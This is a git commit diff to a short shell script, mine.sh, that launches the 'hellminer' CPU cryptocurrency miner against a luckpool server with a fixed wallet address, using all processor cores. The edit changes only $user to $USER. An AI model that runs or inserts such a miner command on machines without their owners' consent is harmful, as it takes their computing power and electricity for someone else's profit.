3affe5b99afdd378148939f0c3a71ee29a04a0d2
Alok <alok.webexpert@gmail.com>
2023-08-09 10:29:51 +0530

    Update mine.sh

--- mine.sh
+++ mine.sh
@@ -1,2 +1,2 @@
 nproc=$(nproc --all)
-./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RMtcmqFQ4tX1aXNiN9vbCZ9htZCiGiv9mi.$user -p x --cpu "$(nproc)"
+./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RMtcmqFQ4tX1aXNiN9vbCZ9htZCiGiv9mi.$USER -p x --cpu "$(nproc)"
